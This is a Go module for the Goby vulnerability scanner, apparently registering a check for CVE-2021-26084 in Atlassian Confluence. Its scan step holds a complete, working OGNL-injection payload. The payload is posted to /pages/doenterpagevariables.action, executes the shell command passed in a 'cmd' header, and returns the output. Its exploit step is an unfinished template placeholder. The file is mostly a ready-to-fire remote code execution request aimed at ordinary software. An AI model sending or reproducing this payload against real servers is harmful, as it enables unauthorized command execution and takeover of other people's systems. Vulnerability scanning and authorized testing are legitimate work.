package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Atlassian Confluence doenterpagevariables.action rce CVE-2021-26084",
  "Description": "",
  "Product": "",
  "Homepage": "",
  "DisclosureDate": null,
  "Author": "",
  "FofaQuery": "app=\"ATLASSIAN-Confluence\" || product=\"ATLASSIAN-Confluence\"",
  "GobyQuery": "app=\"ATLASSIAN-Confluence\" || product=\"ATLASSIAN-Confluence\"",
  "Level": "3",
  "Impact": "",
  "Recommendation": "",
  "References": [],
  "Is0day": false,
  "HasExp": false,
  "ExpParams": [],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/pages/doenterpagevariables.action",
        "follow_redirect": true,
        "header": {
          "Content-Type": "application/x-www-form-urlencoded",
          "Cookie": "JSESSIONID=3E654B6F4ADDF325CA2203596BD0115C",
          "cmd": "id"
        },
        "data_type": "text",
        "data": "queryString=%5Cu0027%2B%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName%28%5Cu0022javax.script.ScriptEngineManager%5Cu0022%29.newInstance%28%29.getEngineByName%28%5Cu0022js%5Cu0022%29.eval%28%5Cu0022var+c%3Dcom.atlassian.core.filters.ServletContextThreadLocal.getRequest%28%29.getHeader%28%5Cu0027cmd%5Cu0027%29%3Bvar+x%3Djava.lang.Runtime.getRuntime%28%29.exec%28c%29%3Bvar+out%3Dcom.atlassian.core.filters.ServletContextThreadLocal.getResponse%28%29.getOutputStream%28%29%3Borg.apache.commons.io.IOUtils.copy%28x.getInputStream%28%29%2Cout%29%3Bout.flush%28%29%3B%5Cu0022%29%7D%2B%5Cu0027"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "uid=",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/test.php",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "test",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "Tags": [],
  "VulType": [],
  "CVEIDs": [
    "CVE-2021-26084"
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "Atlassian Confluence doenterpagevariables.action rce CVE-2021-26084",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    },
    "EN": {
      "Name": "Atlassian Confluence doenterpagevariables.action rce CVE-2021-26084",
      "Product": "",
      "Description": "",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}